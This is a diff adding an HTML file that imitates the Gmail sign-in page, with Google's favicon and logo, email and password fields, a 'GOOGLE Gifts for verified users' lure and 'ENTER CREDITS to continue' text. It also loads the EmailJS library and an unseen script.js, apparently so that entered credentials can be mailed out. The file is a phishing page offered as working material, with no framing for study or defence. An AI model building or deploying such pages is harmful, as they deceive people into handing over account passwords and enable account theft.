@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/ico/gmail.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="header">
+        <div class="language">English (United States) ▼</div>
+    </div>
+    
+    <div class="container">
+        <div class="logo">
+            <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24">
+                <path d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.961-3.349c-.21.669-.423 1.173-.65 1.527-.955 1.527-2.76 2.626-5.425 2.626z" fill="#EA4335"></path>
+                <path d="M40.13 30.954c3.532 0 6.721-1.341 8.977-3.436l-6.476-2.681c-1.211.833-2.751 1.317-4.501 1.317-3.453 0-6.398-2.344-7.43-5.514h-6.66v3.449c1.89 3.698 5.61 6.018 9.99 6.018z" fill="#4285F4"></path>
+                <path d="M32.7 19.454c-.299-.935-.474-1.932-.474-2.954s.175-2.019.474-2.954V10.1h-6.66c-.983 1.962-1.54 4.157-1.54 6.454s.557 4.492 1.54 6.454h6.66v-3.449z" fill="#FBBC05"></path>
+                <path d="M40.13 7.198c2.106 0 3.891.747 5.252 2.196l3.941-3.941C46.744.928 43.63 0 40.13 0c-4.38 0-8.1 2.32-9.99 6.018l6.66 3.448c1.032-3.17 3.977-5.514 7.43-5.514z" fill="#34A853"></path>
+                <path d="M67.954 7.696c-2.292-2.273-5.545-3.588-9.108-3.588-4.38 0-8.1 2.32-9.99 6.018l6.66 3.448c.969-2.941 3.698-5.036 6.888-5.036 1.935 0 3.565.702 4.758 1.866l5.91-5.91c-2.81-2.6-6.51-4.172-10.678-4.172z" fill="#EA4335"></path>
+                <path d="M15.56 12.1c-.299-.935-.474-1.932-.474-2.954s.175-2.019.474-2.954V2.746H8.9C7.917 4.708 7.36 6.903 7.36 9.2s.557 4.492 1.54 6.454h6.7V12.1z" fill="#FBBC05"></path>
+            </svg>
+        </div>
+        
+        <div class="title">Sign in</div>
+        <div class="subtitle">Use your Google Account</div>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" required>
+                <label for="email">Email or phone</label>
+            </div>
+            
+            <div class="forgot">
+                <a href="#">Forgot email?</a>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="password" required>
+                <label for="password">Enter your password</label>
+            </div>
+            
+            <div class="notRobot">
+                <span>ENTER CREDITS to continue</span>
+            </div>
+            
+            <div class="giftMessage">
+                <span>GOOGLE Gifts for verified users</span>
+            </div>
+            
+            <div class="buttons">
+                <a href="#" class="learn">Learn more</a>
+                <button type="submit" class="next">Next</button>
+            </div>
+        </form>
+        
+        <div class="create">
+            <span>Not your computer? Use Guest mode to sign in privately.</span>
+            <a href="#">Learn more</a>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">Create account</a>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="location">
+            <svg viewBox="0 0 24 24" width="16" height="16">
+                <path fill="#5F6368" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+            </svg>
+            United States
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
